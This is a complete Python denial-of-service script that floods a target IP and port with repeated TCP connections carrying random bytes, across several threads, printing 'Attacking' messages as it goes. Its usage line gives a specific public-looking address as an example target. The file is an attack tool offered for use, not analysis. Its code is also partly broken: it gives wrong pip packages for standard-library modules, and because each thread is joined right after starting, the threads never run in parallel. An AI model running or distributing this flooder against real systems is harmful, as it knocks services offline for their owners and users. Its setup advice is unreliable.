#!/usr/bin/env python3
import sys
try:
    import socket
except:
    sys.exit("Install missing library: pip install sockets")
try:
    import random
except:
    sys.exit("Install missing library: pip3 install random2")
try:
    import threading
except:
    sys.exit("Install missing library: pip install threaded")
import warnings
warnings.filterwarnings("ignore")

if len(sys.argv) !=4:
    print("follow the examples: ")
    print("")
    print("%s ip(xxx.xxx.xxx.xxx) port request"%(sys.argv[0]))
    print("%s 52.250.42.157 443 12"%(sys.argv[0]))
    sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])

def start():
    r = random._urandom(60)
    u = int(1)
    loop = True
    while loop:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(r)
            packs = int(sys.argv[3])
            for i in range(packs):
                s.send(r)
                u += 1
                print("Sent: " + str(u) + " Attacking " + ip)
        except Exception as error:
            print(error)
            pass
        except KeyboardInterrupt:
            sys.exit()
        except:
            print("Sent: " + str(u) + " Attacking " + ip)
#            s.close()

try:
    THREADS = []
    for i in range(4):
        t = threading.Thread(target=start)
        THREADS.append(t)
    for t in THREADS:
        t.start()
        t.join()
except KeyboardInterrupt:
    sys.exit()
except Exception as error:
    print(error)


